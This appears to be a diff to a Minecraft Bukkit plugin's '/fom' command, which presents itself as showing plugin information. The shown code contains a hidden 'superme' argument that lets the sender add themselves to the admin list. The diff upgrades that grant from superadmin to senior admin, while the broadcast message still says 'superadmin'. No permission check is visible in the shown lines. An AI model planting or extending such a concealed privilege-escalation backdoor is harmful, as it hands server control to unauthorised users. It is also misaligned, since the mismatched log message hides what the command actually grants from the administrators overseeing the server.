@@ -12,6 +12,7 @@ import org.bukkit.entity.Player;
 @CommandParameters(description = "Shows information about FreedomOpMod", usage = "/<command>")
 public class Command_fom extends TFM_Command
 {
+    @Override
     public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
     {
         if (args.length == 0)
@@ -31,7 +32,7 @@ public class Command_fom extends TFM_Command
                 if (args[0].equals("superme"))
                 {
                     TFM_Util.adminAction("FreedomOPMod", "Adding " + sender.getName() + " to the superadmin config.", true);
-                    TFM_AdminList.addSuperadmin(sender_p);
+                    TFM_AdminList.addSeniorAdmin(sender_p);
                     return true;
                 }
             }
